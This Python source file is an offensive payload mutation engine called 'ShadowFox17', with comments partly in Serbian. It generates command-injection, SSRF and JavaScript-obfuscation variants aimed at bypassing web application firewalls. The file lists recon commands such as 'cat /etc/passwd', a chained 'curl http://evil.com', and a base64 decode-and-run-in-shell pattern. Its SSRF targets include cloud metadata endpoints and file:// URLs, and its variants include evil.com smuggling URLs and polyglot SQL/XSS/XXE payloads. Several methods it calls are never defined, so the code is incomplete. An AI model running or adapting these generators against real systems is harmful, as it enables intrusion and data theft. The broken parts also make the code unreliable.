#!/usr/bin/env python3
"""
ShadowFox17 - Advanced Mutation Engine
RCE, SSRF, JS Obfuscation sa AI-driven fuzzy transformacijama
"""

import re
import random
import base64
import urllib.parse
import string
import json
import hashlib
import time
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import itertools

class MutationType(Enum):
    RCE = "rce"
    SSRF = "ssrf"
    JS_OBFUSCATION = "js_obfuscation"
    ENCODING = "encoding"
    BYPASS = "bypass"
    POLYGLOT = "polyglot"

@dataclass
class MutationResult:
    original: str
    mutated: str
    mutation_type: MutationType
    technique: str
    complexity_score: float
    bypass_score: float
    success_probability: float
    metadata: Dict[str, Any]

class ShadowFoxMutationEngine:
    """
    Napredni mutation engine sa AI-driven transformacijama
    Specijalizovan za RCE, SSRF i JS obfuscation
    """
    
    def __init__(self):
        self.mutation_history: List[MutationResult] = []
        self.success_patterns: Dict[str, float] = {}
        self.ai_learning_data: Dict[str, Any] = {}
        
        # Encoding variations
        self.encodings = {
            'url': urllib.parse.quote,
            'url_double': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'html': lambda x: ''.join(f'&#{ord(c)};' for c in x),
            'hex': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x if ord(c) < 65536),
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
        }
        
        # RCE Commands database
        self.rce_commands = {
            'unix': [
                'id', 'whoami', 'pwd', 'ls', 'cat /etc/passwd', 'uname -a',
                'ps aux', 'netstat -an', 'env', 'mount', 'df -h'
            ],
            'windows': [
                'whoami', 'dir', 'type C:\\Windows\\System32\\drivers\\etc\\hosts',
                'ipconfig', 'systeminfo', 'tasklist', 'net user'
            ],
            'generic': [
                'echo "pwned"', 'sleep 5', 'ping -c 3 127.0.0.1', 'curl http://evil.com'
            ]
        }
        
        # SSRF targets
        self.ssrf_targets = [
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://localhost:22', 'http://127.0.0.1:80',
            'http://0.0.0.0:3306', 'http://[::1]:80',
            'file:///etc/passwd', 'file:///c:/windows/system32/drivers/etc/hosts',
            'gopher://127.0.0.1:3306/', 'dict://127.0.0.1:11211/',
            'ftp://127.0.0.1/', 'ldap://127.0.0.1:389/'
        ]
        
        # JS obfuscation techniques
        self.js_obfuscation_methods = [
            'string_split', 'char_codes', 'eval_variants', 'unicode_escape',
            'hex_encoding', 'function_constructor', 'template_literals',
            'property_access', 'bracket_notation', 'regex_constructor'
        ]
    
    # === RCE MUTATIONS ===
    
    def mutate_rce_payload(self, payload: str, intensity: int = 5) -> List[MutationResult]:
        """Generiše RCE mutacije sa različitim bypass tehnikama"""
        mutations = []
        
        for i in range(intensity):
            # Base command mutations
            mutations.extend(self._rce_command_variations(payload))
            
            # Injection context mutations
            mutations.extend(self._rce_context_mutations(payload))
            
            # Encoding bypass mutations
            mutations.extend(self._rce_encoding_mutations(payload))
            
            # WAF bypass mutations
            mutations.extend(self._rce_waf_bypass_mutations(payload))
            
            # Polyglot mutations
            mutations.extend(self._rce_polyglot_mutations(payload))
        
        return self._score_and_rank_mutations(mutations)
    
    def _rce_command_variations(self, payload: str) -> List[MutationResult]:
        """RCE command variations i substitutions"""
        mutations = []
        
        # Command substitution variants
        substitutions = [
            ('cat', ['tac', 'head', 'tail', 'od', 'xxd', 'strings']),
            ('ls', ['dir', 'find', 'locate', 'echo *']),
            ('id', ['whoami', 'groups', 'finger']),
            ('wget', ['curl', 'nc', 'telnet']),
            ('echo', ['printf', 'print'])
        ]
        
        for original, alternatives in substitutions:
            if original in payload.lower():
                for alt in alternatives:
                    mutated = payload.replace(original, alt)
                    mutations.append(MutationResult(
                        original=payload,
                        mutated=mutated,
                        mutation_type=MutationType.RCE,
                        technique=f"command_substitution_{alt}",
                        complexity_score=0.3,
                        bypass_score=0.6,
                        success_probability=0.7,
                        metadata={'substitution': f"{original} -> {alt}"}
                    ))
        
        # Command chaining variations
        chain_operators = ['&&', '||', ';', '|', '&']
        for op in chain_operators:
            if op not in payload:
                for cmd in random.sample(self.rce_commands['generic'], 2):
                    mutated = f"{payload} {op} {cmd}"
                    mutations.append(MutationResult(
                        original=payload,
                        mutated=mutated,
                        mutation_type=MutationType.RCE,
                        technique=f"command_chaining_{op}",
                        complexity_score=0.5,
                        bypass_score=0.4,
                        success_probability=0.6,
                        metadata={'operator': op, 'chained_command': cmd}
                    ))
        
        # Command obfuscation
        obfuscation_techniques = [
            lambda x: x.replace(' ', '${IFS}'),  # IFS substitution
            lambda x: x.replace(' ', '<>'),      # <> redirection
            lambda x: x.replace(' ', '\\t'),     # Tab substitution  
            lambda x: ''.join(f'\\{c}' if c.isalpha() else c for c in x),  # Backslash escape
            lambda x: f'"{x}"',                  # Quote wrapping
            lambda x: f"$'{x}'",                 # ANSI-C quoting
        ]
        
        for technique in obfuscation_techniques:
            try:
                mutated = technique(payload)
                technique_name = technique.__name__ if hasattr(technique, '__name__') else 'anonymous'
                mutations.append(MutationResult(
                    original=payload,
                    mutated=mutated,
                    mutation_type=MutationType.RCE,
                    technique=f"obfuscation_{technique_name}",
                    complexity_score=0.7,
                    bypass_score=0.8,
                    success_probability=0.5,
                    metadata={'obfuscation_type': technique_name}
                ))
            except:
                continue
        
        return mutations
    
    def _rce_context_mutations(self, payload: str) -> List[MutationResult]:
        """RCE injection context mutations"""
        mutations = []
        
        # Different injection contexts
        contexts = [
            # Basic injections
            lambda x: f"; {x}",
            lambda x: f"| {x}",
            lambda x: f"&& {x}",
            lambda x: f"|| {x}",
            lambda x: f"`{x}`",
            lambda x: f"$({x})",
            lambda x: f"${{{x}}}",
            
            # Quote escapes
            lambda x: f"'; {x}; echo '",
            lambda x: f'"; {x}; echo "',
            lambda x: f"\\'; {x}; echo \\'",
            
            # Parameter pollution
            lambda x: f"param=value&cmd={x}",
            lambda x: f"data[cmd]={x}",
            lambda x: f"exec={x}&debug=1",
            
            # JSON injection
            lambda x: f'{{"cmd": "{x}", "debug": true}}',
            lambda x: f'{{\\\"exec\\\": \\\"{x}\\\"}}',
            
            # XML injection
            lambda x: f"<cmd>{x}</cmd>",
            lambda x: f"<![CDATA[{x}]]>",
        ]
        
        for context_func in contexts:
            try:
                mutated = context_func(payload)
                mutations.append(MutationResult(
                    original=payload,
                    mutated=mutated,
                    mutation_type=MutationType.RCE,
                    technique="context_injection",
                    complexity_score=0.4,
                    bypass_score=0.6,
                    success_probability=0.6,
                    metadata={'context': context_func.__name__ if hasattr(context_func, '__name__') else 'lambda'}
                ))
            except:
                continue
        
        return mutations
    
    def _rce_encoding_mutations(self, payload: str) -> List[MutationResult]:
        """RCE encoding bypass mutations"""
        mutations = []
        
        # Standard encodings
        for enc_name, enc_func in self.encodings.items():
            try:
                mutated = enc_func(payload)
                mutations.append(MutationResult(
                    original=payload,
                    mutated=mutated,
                    mutation_type=MutationType.ENCODING,
                    technique=f"encoding_{enc_name}",
                    complexity_score=0.3,
                    bypass_score=0.7,
                    success_probability=0.5,
                    metadata={'encoding': enc_name}
                ))
            except:
                continue
        
        # Advanced encoding combinations
        try:
            # Double encoding
            double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
            mutations.append(MutationResult(
                original=payload,
                mutated=double_encoded,
                mutation_type=MutationType.ENCODING,
                technique="double_url_encoding",
                complexity_score=0.5,
                bypass_score=0.8,
                success_probability=0.4,
                metadata={'encoding': 'double_url'}
            ))
            
            # Base64 + URL encoding
            b64_payload = base64.b64encode(payload.encode()).decode()
            b64_url_encoded = urllib.parse.quote(b64_payload)
            mutations.append(MutationResult(
                original=payload,
                mutated=f"echo {b64_url_encoded} | base64 -d | sh",
                mutation_type=MutationType.ENCODING,
                technique="base64_url_combo",
                complexity_score=0.8,
                bypass_score=0.9,
                success_probability=0.3,
                metadata={'encoding': 'base64_url_combo'}
            ))
        except:
            pass
        
        return mutations
    
    def _rce_waf_bypass_mutations(self, payload: str) -> List[MutationResult]:
        """WAF bypass specifične RCE mutacije"""
        mutations = []
        
        # Case variations
        case_variations = [
            payload.upper(),
            payload.lower(),
            ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)),
            ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        ]
        
        for variation in case_variations:
            if variation != payload:
                mutations.append(MutationResult(
                    original=payload,
                    mutated=variation,
                    mutation_type=MutationType.BYPASS,
                    technique="case_variation",
                    complexity_score=0.2,
                    bypass_score=0.5,
                    success_probability=0.4,
                    metadata={'case_type': 'variation'}
                ))
        
        # Whitespace and delimiter variations
        whitespace_mutations = [
            payload.replace(' ', '\t'),
            payload.replace(' ', '\n'),
            payload.replace(' ', '\r'),
            payload.replace(' ', '\f'),
            payload.replace(' ', '\v'),
            payload.replace(' ', '/**/'),  # SQL comment style
            payload.replace(' ', '%20'),   # URL encoded space
            payload.replace(' ', '+'),     # Plus encoded space
        ]
        
        for mutated in whitespace_mutations:
            if mutated != payload:
                mutations.append(MutationResult(
                    original=payload,
                    mutated=mutated,
                    mutation_type=MutationType.BYPASS,
                    technique="whitespace_bypass",
                    complexity_score=0.3,
                    bypass_score=0.6,
                    success_probability=0.5,
                    metadata={'whitespace_type': 'substitution'}
                ))
        
        # Comment injection
        comment_styles = [
            f"{payload}/*comment*/",
            f"{payload}//comment",
            f"{payload}#comment",
            f"/*comment*/{payload}",
            f"#{payload}",
        ]
        
        for mutated in comment_styles:
            mutations.append(MutationResult(
                original=payload,
                mutated=mutated,
                mutation_type=MutationType.BYPASS,
                technique="comment_injection",
                complexity_score=0.4,
                bypass_score=0.7,
                success_probability=0.6,
                metadata={'comment_style': 'injection'}
            ))
        
        return mutations
    
    def _rce_polyglot_mutations(self, payload: str) -> List[MutationResult]:
        """Polyglot RCE payloads koji rade u više kontekstova"""
        mutations = []
        
        polyglot_templates = [
            # Shell + SQL
            f"'; {payload}; --",
            f"\"; {payload}; --",
            f"'; {payload}; #",
            
            # Shell + XSS
            f"<script>/*'; {payload}; //*/</script>",
            f"javascript:/*'; {payload}; //*/",
            
            # Shell + XXE
            f"<!DOCTYPE test [<!ENTITY test '{payload}'>]><test>&test;</test>",
            
            # Shell + LDAP
            f"*)({payload})(cn=*",
            
            # Shell + NoSQL
            f"'; {payload}; return true; var x='",
        ]
        
        for template in polyglot_templates:
            mutations.append(MutationResult(
                original=payload,
                mutated=template,
                mutation_type=MutationType.POLYGLOT,
                technique="polyglot_injection",
                complexity_score=0.9,
                bypass_score=0.8,
                success_probability=0.4,
                metadata={'polyglot_type': 'multi_context'}
            ))
        
        return mutations
    
    # === SSRF MUTATIONS ===
    
    def mutate_ssrf_payload(self, url: str, intensity: int = 5) -> List[MutationResult]:
        """Generiše SSRF mutacije sa bypass tehnikama"""
        mutations = []
        
        for i in range(intensity):
            # URL format mutations
            mutations.extend(self._ssrf_url_mutations(url))
            
            # IP address mutations
            mutations.extend(self._ssrf_ip_mutations(url))
            
            # Protocol mutations
            mutations.extend(self._ssrf_protocol_mutations(url))
            
            # Encoding mutations
            mutations.extend(self._ssrf_encoding_mutations(url))
            
            # Redirect chain mutations
            mutations.extend(self._ssrf_redirect_mutations(url))
        
        return self._score_and_rank_mutations(mutations)
    
    def _ssrf_url_mutations(self, url: str) -> List[MutationResult]:
        """SSRF URL format mutations"""
        mutations = []
        
        # Parse URL components
        try:
            if '://' not in url:
                url = f"http://{url}"
            
            # Different localhost representations
            localhost_variants = [
                '127.0.0.1', '0.0.0.0', '::1', 'localhost',
                '127.1', '127.0.1', '0x7f000001', '2130706433',
                '017700000001', '127.000.000.001', '127.0.0.0x1'
            ]
            
            for variant in localhost_variants:
                mutated = url.replace('127.0.0.1', variant).replace('localhost', variant)
                if mutated != url:
                    mutations.append(MutationResult(
                        original=url,
                        mutated=mutated,
                        mutation_type=MutationType.SSRF,
                        technique="localhost_variant",
                        complexity_score=0.4,
                        bypass_score=0.7,
                        success_probability=0.6,
                        metadata={'variant': variant}
                    ))
            
            # Port variations
            common_ports = ['80', '443', '8080', '8443', '3000', '5000', '8000']
            for port in common_ports:
                if f":{port}" not in url:
                    mutated = url.rstrip('/') + f":{port}"
                    mutations.append(MutationResult(
                        original=url,
                        mutated=mutated,
                        mutation_type=MutationType.SSRF,
                        technique="port_addition",
                        complexity_score=0.3,
                        bypass_score=0.5,
                        success_probability=0.7,
                        metadata={'port': port}
                    ))
        
        except Exception as e:
            pass
        
        return mutations
    
    def _ssrf_ip_mutations(self, url: str) -> List[MutationResult]:
        """SSRF IP address format mutations"""
        mutations = []
        
        # IPv6 variations
        ipv6_variants = [
            '[::1]', '[0:0:0:0:0:0:0:1]', '[::ffff:127.0.0.1]',
            '[2001:db8::1]', '[fe80::1]'
        ]
        
        for variant in ipv6_variants:
            mutated = re.sub(r'127\.0\.0\.1|localhost', variant, url)
            if mutated != url:
                mutations.append(MutationResult(
                    original=url,
                    mutated=mutated,
                    mutation_type=MutationType.SSRF,
                    technique="ipv6_variant",
                    complexity_score=0.5,
                    bypass_score=0.8,
                    success_probability=0.4,
                    metadata={'ipv6': variant}
                ))
        
        # Decimal/Hex IP representations
        ip_formats = [
            '2130706433',      # Decimal
            '0x7f000001',      # Hex
            '017700000001',    # Octal
            '127.1',           # Short form
            '127.0.1',         # Shorter form
        ]
        
        for ip_format in ip_formats:
            mutated = url.replace('127.0.0.1', ip_format)
            if mutated != url:
                mutations.append(MutationResult(
                    original=url,
                    mutated=mutated,
                    mutation_type=MutationType.SSRF,
                    technique="ip_format_variation",
                    complexity_score=0.6,
                    bypass_score=0.9,
                    success_probability=0.3,
                    metadata={'ip_format': ip_format}
                ))
        
        return mutations
    
    def _ssrf_protocol_mutations(self, url: str) -> List[MutationResult]:
        """SSRF protocol mutations"""
        mutations = []
        
        # Different protocols
        protocols = [
            'file://', 'ftp://', 'gopher://', 'dict://', 'sftp://',
            'ldap://', 'ldaps://', 'tftp://', 'jar://', 'netdoc://'
        ]
        
        base_url = url.split('://', 1)[-1] if '://' in url else url
        
        for protocol in protocols:
            mutated = f"{protocol}{base_url}"
            mutations.append(MutationResult(
                original=url,
                mutated=mutated,
                mutation_type=MutationType.SSRF,
                technique="protocol_substitution",
                complexity_score=0.7,
                bypass_score=0.8,
                success_probability=0.5,
                metadata={'protocol': protocol}
            ))
        
        # Protocol smuggling
        smuggling_variants = [
            f"http://evil.com@{base_url}",
            f"http://{base_url}@evil.com",
            f"http://evil.com#@{base_url}",
            f"http://evil.com/?url={url}",
        ]
        
        for variant in smuggling_variants:
            mutations.append(MutationResult(
                original=url,
                mutated=variant,
                mutation_type=MutationType.SSRF,
                technique="protocol_smuggling",
                complexity_score=0.8,
                bypass_score=0.9,
                success_probability=0.3,
                metadata={'smuggling_type': 'url_manipulation'}
            ))
        
        return mutations
    
    def _ssrf_encoding_mutations(self, url: str) -> List[MutationResult]:
        """SSRF encoding bypass mutations"""
        mutations = []
        
        # URL encoding variations
        for enc_name, enc_func in self.encodings.items():
            if enc_name in ['url', 'url_double']:
                try:
                    mutated = enc_func(url)
                    mutations.append(MutationResult(
                        original=url,
                        mutated=mutated,
                        mutation_type=MutationType.ENCODING,
                        technique=f"ssrf_{enc_name}_encoding",
                        complexity_score=0.4,
                        bypass_score=0.6,
                        success_probability=0.5,
                        metadata={'encoding': enc_name}
                    ))
                except:
                    continue
        
        # Unicode encoding
        unicode_variants = [
            url.replace('localhost', 'loc\\u0061lhost'),
            url.replace('127.0.0.1', '127.\\u0030.0.1'),
            url.replace('http', 'htt\\u0070'),
        ]
        
        for variant in unicode_variants:
            if variant != url:
                mutations.append(MutationResult(
                    original=url,
                    mutated=variant,
                    mutation_type=MutationType.ENCODING,
                    technique="unicode_encoding",
                    complexity_score=0.6,
                    bypass_score=0.8,
                    success_probability=0.4,
                    metadata={'encoding': 'unicode'}
                ))
        
        return mutations
    
    def _ssrf_redirect_mutations(self, url: str) -> List[MutationResult]:
        """SSRF redirect chain mutations"""
        mutations = []
        
        # Redirect service URLs
        redirect_services = [
            f"http://evil.com/redirect?url={urllib.parse.quote(url)}",
            f"https://bit.ly/create?url={urllib.parse.quote(url)}",
            f"http://tinyurl.com/create.php?url={urllib.parse.quote(url)}",
            f"http://redirect.com/?goto={urllib.parse.quote(url)}",
        ]
        
        for redirect_url in redirect_services:
            mutations.append(MutationResult(
                original=url,
                mutated=redirect_url,
                mutation_type=MutationType.SSRF,
                technique="redirect_chain",
                complexity_score=0.5,
                bypass_score=0.7,
                success_probability=0.4,
                metadata={'redirect_service': 'external'}
            ))
        
        return mutations
    
    # === JS OBFUSCATION MUTATIONS ===
    
    def mutate_js_payload(self, js_code: str, intensity: int = 5) -> List[MutationResult]:
        """Generiše JavaScript obfuscation mutacije"""
        mutations = []
        
        for i in range(intensity):
            # String obfuscation
            mutations.extend(self._js_string_obfuscation(js_code))
            
            # Character encoding obfuscation
            mutations.extend(self._js_char_encoding_obfuscation(js_code))
            
            # Function obfuscation
            mutations.extend(self._js_function_obfuscation(js_code))
            
            # Property access obfuscation
            mutations.extend(self._js_property_obfuscation(js_code))
            
            # Advanced obfuscation techniques
            mutations.extend(self._js_advanced_obfuscation(js_code))
        
        return self._score_and_rank_mutations(mutations)
    
    def _js_string_obfuscation(self, js_code: str) -> List[MutationResult]:
        """JavaScript string obfuscation mutations"""
        mutations = []
        
        # String splitting
        if len(js_code) > 1:
            # Split string into parts
            parts = [js_code[i:i+2] for i in range(0, len(js_code), 2)]
            split_version = '+'.join(f'"{part}"' for part in parts)
            mutations.append(MutationResult(
                original=js_code,
                mutated=split_version,
                mutation_type=MutationType.JS_OBFUSCATION,
                technique="string_splitting",
                complexity_score=0.5,
                bypass_score=0.7,
                success_probability=0.8,
                metadata={'split_size': 2}
            ))
        
        # Character code obfuscation
        char_codes = [str(ord(c)) for c in js_code]
        char_code_version = 'String.fromCharCode(' + ','.join(char_codes) + ')'
        mutations.append(MutationResult(
            original=js_code,
            mutated=char_code_version,
            mutation_type=MutationType.JS_OBFUSCATION,
            technique="char_code_obfuscation",
            complexity_score=0.7,
            bypass_score=0.8,
            success_probability=0.7,
            metadata={'method': 'fromCharCode'}
        ))
        
        # Template literal obfuscation
        template_version = '`' + js_code.replace('`', '\\`') + '`'
        mutations.append(MutationResult(
            original=js_code,
            mutated=template_version,
            mutation_type=MutationType.JS_OBFUSCATION,
            technique="template_literal",
            complexity_score=0.3,
            bypass_score=0.5,
            success_probability=0.9,
            metadata={'method': 'template_literal'}
        ))
        
        return mutations
    
    def _js_char_encoding_obfuscation(self, js_code: str) -> List[MutationResult]:
        """JavaScript character encoding obfuscation"""
        mutations = []
        
        # Hex encoding
        hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in js_code)
        mutations.append(MutationResult(
            original=js_code,
            mutated=f'"{hex_encoded}"',
            mutation_type=MutationType.JS_OBFUSCATION,
            technique="hex_encoding",
            complexity_score=0.6,
            bypass_score=0.8,
            success_probability=0.7,
            metadata={'encoding': 'hex'}
        ))
        
        # Unicode encoding
        unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in js_code if ord(c) < 65536)
        if unicode_encoded:
            mutations.append(MutationResult(
                original=js_code,
                mutated=f'"{unicode_encoded}"',
                mutation_type=MutationType.JS_OBFUSCATION,
                technique="unicode_encoding",
                complexity_score=0.6,
                bypass_score=0.8,
                success_probability=0.7,
                metadata={'encoding': 'unicode'}
            ))
        
        # Octal encoding
        octal_encoded = ''.join(f'\\{oct(ord(c))[2:]}' for c in js_code)
        mutations.append(MutationResult(
            original=js_code,
            mutated=f'"{octal_encoded}"',
            mutation_type=MutationType.JS_OBFUSCATION,
            technique="octal_encoding",
            complexity_score=0.6,
            bypass_score=0.7,
            success_probability=0.6,
            metadata={'encoding': 'octal'}
        ))
        
        return mutations
    def mutate(self, input_code):
        print("[MUTATE] Pokrećem mutaciju")
        return self._js_function_obfuscation(input_code)
    def _js_function_obfuscation(self, js_code: str) -> List[MutationResult]:
        """JavaScript function obfuscation mutations"""
        mutations = []

    # Function constructor (safe escape)
        escaped = js_code.replace('"', '\\"')
        function_constructor = f'Function("{escaped}")()'
        mutations.append(MutationResult(
            original=js_code,
            mutated=function_constructor,
            mutation_type=MutationType.JS_OBFUSCATION,
            technique="function_constructor",
            complexity_score=0.8,
            bypass_score=0.9,
            success_probability=0.6,
            metadata={'method': 'Function_constructor'}
        ))

    # Eval variants (safe)
        eval_escaped = js_code.replace('"', '\\"')

        eval_variants = [
            f'eval("{eval_escaped}")',
            f'window["ev"+"al"]("{eval_escaped}")',
            f'({{}})["constructor"]["constructor"]("{eval_escaped}")()',
            f'setTimeout("{eval_escaped}", 1000)'
        ]

        for variant in eval_variants:
            mutations.append(MutationResult(
                original=js_code,
                mutated=variant,
                mutation_type=MutationType.JS_OBFUSCATION,
                technique="eval_variant",
                complexity_score=0.7,
                bypass_score=0.6,
                success_probability=0.5,
                metadata={'method': 'eval_variant'}
            ))

        return mutations
